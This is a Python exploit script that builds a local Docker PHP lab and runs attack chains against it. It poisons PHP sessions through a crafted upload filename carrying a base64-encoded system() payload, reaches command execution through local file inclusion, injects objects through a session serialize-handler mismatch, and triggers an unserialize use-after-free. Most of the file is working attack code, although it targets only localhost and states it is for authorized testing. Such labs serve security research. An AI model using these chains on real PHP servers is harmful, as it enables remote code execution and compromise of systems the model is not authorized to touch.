#!/usr/bin/env python3
"""php2shell test - PHP session-poisoning lab + exploit chains.

Runtime deps: python3 stdlib + docker compose. Lab files are rendered from
templates/ into lab/ (gitignored, regenerated with --regen).

Chains:
  rce       session fixation + filename injection -> LFI include -> command exec
  mismatch  php_serialize writer + php reader -> injected object instantiated
            (proven by a __destruct marker file inside the php container)
  uaf       unserialize() var_destroy/__destruct reentry read-after-free,
            ASAN-confirmed on stock PHP 8.2.34

Authorized testing against infrastructure you own only.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import http.client
import logging
import os
import re
import secrets
import shutil
import subprocess
import sys
import urllib.parse
from pathlib import Path
from string import Template

HERE = Path(__file__).resolve().parent
LAB = HERE / "lab"
TEMPLATES = HERE / "templates"
HOST = "127.0.0.1"
DEFAULT_PORT = 18081
SESSIONS = "/tmp/sessions"
GADGET_MARKER = "/tmp/gadget-hit"
PORT_FILE = LAB / ".http-port"

SID_RE = re.compile(r"^[A-Za-z0-9,-]{1,128}$")
CLASS_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
READY_MARK = "lab ready"

log = logging.getLogger("php2shell")


class LabError(RuntimeError):
    """A user-facing failure (bad input, missing lab, docker error)."""


# --------------------------------------------------------------------------
# compose plumbing
# --------------------------------------------------------------------------
def project_name() -> str:
    """Per-checkout compose project name, so parallel clones never collide."""
    override = os.environ.get("PHP2SHELL_PROJECT")
    if override:
        return override
    digest = hashlib.sha1(str(HERE).encode()).hexdigest()[:8]
    return f"php2shell-{digest}"


def _run(
    args: list[str],
    *,
    input_bytes: bytes | None = None,
    text: bool = True,
    check: bool = True,
    timeout: float = 60,
) -> subprocess.CompletedProcess:
    cmd = ["docker", *args]
    log.debug("run: %s", " ".join(cmd))
    try:
        proc = subprocess.run(
            cmd,
            cwd=LAB,
            input=input_bytes,
            capture_output=True,
            timeout=timeout,
        )
    except FileNotFoundError as exc:
        raise LabError("docker is not installed or not on PATH") from exc
    except subprocess.TimeoutExpired as exc:
        raise LabError(f"docker command timed out after {timeout:.0f}s: {' '.join(cmd)}") from exc
    out: str | bytes = proc.stdout.decode("utf-8", "replace") if text else proc.stdout
    err: str | bytes = proc.stderr.decode("utf-8", "replace") if text else proc.stderr
    if check and proc.returncode != 0:
        detail = err if isinstance(err, str) else err.decode("utf-8", "replace")
        raise LabError(f"command failed ({proc.returncode}): {' '.join(cmd)}\n{detail.strip()}")
    return subprocess.CompletedProcess(proc.args, proc.returncode, out, err)


def compose(*args: str, **kwargs) -> subprocess.CompletedProcess:
    if not (LAB / "docker-compose.yml").is_file():
        raise LabError(f"lab/ is not generated yet: run '{script_name()} gen' or 'up' first")
    return _run(["compose", "--project-name", project_name(), *args], **kwargs)


# --------------------------------------------------------------------------
# lab rendering
# --------------------------------------------------------------------------
def _render(path: Path, **values: object) -> str:
    return Template(path.read_text(encoding="utf-8")).substitute(**values)


def _display_path(path: Path) -> str:
    try:
        return str(path.relative_to(HERE))
    except ValueError:
        return str(path)


def generate_lab(http_port: int, *, regen: bool = False) -> list[Path]:
    """Render templates/ into lab/. Existing files are kept unless regen=True."""
    if not TEMPLATES.is_dir():
        raise LabError(f"missing templates directory: {TEMPLATES}")
    LAB.mkdir(parents=True, exist_ok=True)
    written: list[Path] = []

    for src in sorted(TEMPLATES.rglob("*")):
        if not src.is_file():
            continue
        rel = src.relative_to(TEMPLATES)
        dst = LAB / rel
        if src.suffix == ".yml":
            # Compose file is pure template output (it carries the HTTP port),
            # so it is rewritten whenever the rendered content changes.
            rendered = _render(src, HTTP_PORT=http_port)
            if dst.is_file() and dst.read_text(encoding="utf-8") == rendered:
                continue
            dst.parent.mkdir(parents=True, exist_ok=True)
            dst.write_text(rendered, encoding="utf-8")
            written.append(dst)
            continue
        if dst.exists() and not regen:
            continue
        dst.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(src, dst)
        written.append(dst)

    PORT_FILE.write_text(f"{http_port}\n", encoding="utf-8")
    if written:
        log.info(
            "lab files %s: %s",
            "regenerated" if regen else "created",
            ", ".join(_display_path(p) for p in written),
        )
    else:
        log.info("lab files already present (use --regen to overwrite)")
    return written


def resolve_port(explicit: int | None) -> int:
    if explicit:
        return explicit
    env = os.environ.get("PHP2SHELL_HTTP_PORT")
    if env:
        try:
            return int(env)
        except ValueError as exc:
            raise LabError(f"PHP2SHELL_HTTP_PORT is not an integer: {env!r}") from exc
    if PORT_FILE.is_file():
        raw = PORT_FILE.read_text(encoding="utf-8").strip()
        if raw.isdigit():
            return int(raw)
    return DEFAULT_PORT


# --------------------------------------------------------------------------
# lab lifecycle
# --------------------------------------------------------------------------
def lab_up(http_port: int, *, regen: bool) -> None:
    generate_lab(http_port, regen=regen)
    log.info("starting lab (project %s, http %s:%d)", project_name(), HOST, http_port)
    # Always recreate: lab/ is regenerated from templates and may have been
    # deleted behind a running container (stale bind mount) or edited in place
    # (php.ini). Recreating keeps the containers identical to what is on disk.
    proc = compose(
        "up",
        "-d",
        "--wait",
        "--wait-timeout",
        "180",
        "--force-recreate",
        check=False,
        timeout=300,
    )
    if proc.returncode != 0:
        logs = compose("logs", "--no-color", "--tail", "40", check=False, timeout=60)
        raise LabError(
            "docker compose up failed; last log lines:\n" + (logs.stdout + logs.stderr).strip()
        )
    print(f"[+] {READY_MARK}: http://{HOST}:{http_port}  (sessions {SESSIONS})")


def lab_down() -> None:
    if not (LAB / "docker-compose.yml").is_file():
        log.info("nothing to do: lab/ is not generated")
        return
    compose("down", "-v", "--remove-orphans", timeout=180)
    print("[+] lab stopped")


def require_running() -> None:
    proc = compose("ps", "--status", "running", "-q", "php", check=False)
    if not proc.stdout.strip():
        raise LabError(f"lab is not running: run '{script_name()} up' first")


def exec_php(*args: str, input_bytes: bytes | None = None) -> str:
    proc = compose("exec", "-T", "php", *args, input_bytes=input_bytes, timeout=120)
    return proc.stdout


def exec_php_bytes(*args: str) -> bytes:
    proc = compose("exec", "-T", "php", *args, text=False, timeout=120)
    return proc.stdout


def session_file(sid: str) -> bytes | None:
    proc = compose("exec", "-T", "php", "cat", f"{SESSIONS}/sess_{sid}", text=False, check=False)
    return proc.stdout if proc.returncode == 0 else None


# --------------------------------------------------------------------------
# HTTP helpers (http.client: real framing, chunked decode, no string surgery)
# --------------------------------------------------------------------------
def _param(value: str) -> str:
    """Escape a Content-Disposition parameter; reject CR/LF and non-ASCII."""
    if "\r" in value or "\n" in value:
        raise LabError("CR/LF is not allowed in multipart parameters")
    try:
        value.encode("ascii")
    except UnicodeEncodeError as exc:
        raise LabError("multipart parameters must be ASCII") from exc
    return value.replace("\\", "\\\\").replace('"', '\\"')


def build_multipart(filename: str, sid: str, boundary: str | None = None) -> tuple[bytes, str]:
    """Return (body, boundary) for the upload_progress poisoning request."""
    boundary = boundary or secrets.token_hex(16)
    if not boundary.isascii() or not boundary:
        raise LabError("invalid multipart boundary")
    parts = [
        f'--{boundary}\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n',
        f"--{boundary}\r\nContent-Disposition: form-data; "
        f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n',
        f"--{boundary}\r\nContent-Disposition: form-data; "
        f'name="f"; filename="{_param(filename)}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nZ\r\n",
        f"--{boundary}--\r\n",
    ]
    body = "".join(parts).encode("utf-8")
    return body, boundary


def _connect(http_port: int, timeout: float = 15) -> http.client.HTTPConnection:
    return http.client.HTTPConnection(HOST, http_port, timeout=timeout)


def post(
    http_port: int,
    path: str,
    *,
    filename: str,
    sid: str,
    cookie: bool = True,
) -> tuple[int, bytes]:
    body, boundary = build_multipart(filename, sid)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
    }
    if cookie:
        headers["Cookie"] = f"PHPSESSID={sid}"
    conn = _connect(http_port)
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        return resp.status, resp.read()
    finally:
        conn.close()


def get(http_port: int, path: str, *, sid: str | None = None) -> tuple[int, bytes]:
    conn = _connect(http_port)
    try:
        headers = {"Cookie": f"PHPSESSID={sid}"} if sid else {}
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        return resp.status, resp.read()
    finally:
        conn.close()


# --------------------------------------------------------------------------
# payloads
# --------------------------------------------------------------------------
def validate_sid(sid: str) -> str:
    if not SID_RE.match(sid):
        raise LabError(
            "--sid must match ^[A-Za-z0-9,-]{1,128}$ (it lands in a URL, "
            "a cookie and a container path)"
        )
    return sid


def validate_class(name: str) -> str:
    if not CLASS_RE.match(name):
        raise LabError("--class must be a PHP identifier: ^[A-Za-z_][A-Za-z0-9_]*$")
    return name


def build_rce_payload(cmd: str) -> str:
    """Base64 the command so the payload stays quote/backslash/CRLF-free."""
    encoded = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
    return f"<?php echo 'POC-OUT['; system(base64_decode('{encoded}')); echo ']POC-OUT'; ?>"


def build_injection(klass: str) -> str:
    """php_serialize key|value fragment carrying an object of ``klass``."""
    return f'x|O:{len(klass.encode("utf-8"))}:"{klass}":0:{{}}'


# --------------------------------------------------------------------------
# chains
# --------------------------------------------------------------------------
def chain_rce(cmd: str, sid: str, http_port: int) -> int:
    payload = build_rce_payload(cmd)
    post(http_port, "/app/upload.php", filename=payload, sid=sid)

    data = session_file(sid)
    if data is None:
        print("[-] no session file was written; is the lab up?")
        return 1
    if payload.encode("utf-8") not in data:
        print("[-] poison failed; session file:", repr(data[:300]))
        return 1
    print(f"[+] session file poisoned with a base64 payload ({len(data)} bytes)")

    page = urllib.parse.quote(f"{SESSIONS}/sess_{sid}", safe="/")
    status, body_bytes = get(http_port, f"/vuln.php?page={page}")
    body = body_bytes.decode("utf-8", "replace")
    if status == 200 and "POC-OUT[" in body:
        out = body.split("POC-OUT[", 1)[1].split("]POC-OUT", 1)[0]
        print(f"[+] RCE via include, cmd={cmd!r}:")
        print(out.rstrip())
        return 0
    print(f"[-] include did not execute the payload (HTTP {status}):\n{body[:400]}")
    return 1


def chain_mismatch(klass: str, sid: str, http_port: int) -> int:
    exec_php("rm", "-f", GADGET_MARKER)
    injection = build_injection(klass)
    post(http_port, "/app/upload.php", filename=injection, sid=sid)

    data = session_file(sid)
    if data is None:
        print("[-] no session file was written; is the lab up?")
        return 1
    log.debug("session file: %r", data[:400])

    # Plain GET: no upload_progress field, so session_start() runs inside the
    # script (where class Gadget is already declared). A multipart POST here
    # would start the session at RINIT, before any userland class exists.
    status, raw = get(http_port, "/api/endpoint.php", sid=sid)
    body = raw.decode("utf-8", "replace")
    warned = "Failed to decode session object" in body

    marker = compose("exec", "-T", "php", "cat", GADGET_MARKER, check=False, timeout=30)
    if marker.returncode == 0:
        proof = marker.stdout.strip()
        print(
            f"[+] {klass} was instantiated in the api/ endpoint "
            f"(__destruct marker: {GADGET_MARKER} -> {proof!r})"
        )
        if warned:
            print("    (the session handler also reported a decode failure)")
        print("    RCE requires a target class with an exploitable __destruct.")
        return 0

    if warned:
        print(
            "[-] handler mismatch produced a decode warning, but the injected "
            "object was NOT instantiated (no marker file)."
        )
        print("    Treat 'Failed to decode session object' alone as inconclusive.")
    else:
        print(f"[-] no decode failure and no marker (HTTP {status}):\n{body[:400]}")
    return 1


def check_uaf() -> int:
    require_running()
    trigger = (TEMPLATES / "uaf_trigger.php").read_bytes()
    exec_php("sh", "-c", "cat > /tmp/uaf_trigger.php", input_bytes=trigger)
    proc = compose(
        "exec",
        "-T",
        "php",
        "env",
        "USE_ZEND_ALLOC=0",
        "php",
        "/tmp/uaf_trigger.php",
        check=False,
        timeout=120,
    )
    err = (proc.stderr or "").strip()
    out = (proc.stdout or "").strip()
    if out:
        print(out)
    if err:
        print(err)
    if "stale var_hash read" in (out + err):
        print("[+] behavioral UAF confirmed on the stock build (stale R:1500 read).")
        print("    ASAN proof needs a sanitizer build: CFLAGS='-fsanitize=address -g -O1'")
        print("    LDFLAGS='-fsanitize=address', USE_ZEND_ALLOC=0 -> heap-use-after-free")
        print("    READ at ext/standard/var_unserializer.c:850, freed at var_destroy:245.")
        return 0
    print("[-] no UAF behavior observed on this build.")
    return 1


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------
def script_name() -> str:
    return Path(sys.argv[0]).name


def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog=script_name(),
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    verbose = ap.add_mutually_exclusive_group()
    verbose.add_argument("-v", "--verbose", action="store_true", help="debug logging")
    verbose.add_argument("-q", "--quiet", action="store_true", help="errors only")
    ap.add_argument(
        "--port",
        type=int,
        default=None,
        help=f"host HTTP port (default: PHP2SHELL_HTTP_PORT, lab/.http-port, {DEFAULT_PORT})",
    )
    sub = ap.add_subparsers(dest="action", required=True)

    p = sub.add_parser("up", help="render lab/ and start containers (waits for health)")
    p.add_argument("--regen", action="store_true", help="overwrite existing lab/ files")
    sub.add_parser("gen", help="render lab/ without starting containers").add_argument(
        "--regen", action="store_true", help="overwrite existing lab/ files"
    )
    sub.add_parser("down", help="stop containers and remove volumes")

    p = sub.add_parser("rce", help="chain 1: session poison -> LFI include -> command exec")
    p.add_argument("--cmd", default="id", help="command to run inside the php container")
    p.add_argument("--sid", default="poc26rce0000000000000000")

    p = sub.add_parser("mismatch", help="chain 2: handler mismatch -> object instantiation")
    p.add_argument(
        "--class",
        dest="klass",
        default="Gadget",
        help="class to instantiate (must exist in api/endpoint.php)",
    )
    p.add_argument("--sid", default="poc26mm00000000000000000")

    sub.add_parser("uaf", help="behavioral unserialize UAF check on the lab's PHP")
    return ap


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.WARNING if args.quiet else logging.INFO,
        format="%(message)s",
    )
    port: int = DEFAULT_PORT
    try:
        port = resolve_port(args.port)
        if args.action == "gen":
            generate_lab(port, regen=args.regen)
            print(f"[+] lab rendered for http://{HOST}:{port} (project {project_name()})")
            return 0
        if args.action == "up":
            lab_up(port, regen=args.regen)
            return 0
        if args.action == "down":
            lab_down()
            return 0
        require_running()
        if args.action == "rce":
            return chain_rce(args.cmd, validate_sid(args.sid), port)
        if args.action == "mismatch":
            return chain_mismatch(validate_class(args.klass), validate_sid(args.sid), port)
        if args.action == "uaf":
            return check_uaf()
    except LabError as exc:
        log.error("[-] %s", exc)
        return 1
    except OSError as exc:
        log.error("[-] cannot reach the lab on %s:%d (%s); check 'up' and --port", HOST, port, exc)
        return 1
    return 1


if __name__ == "__main__":
    sys.exit(main())
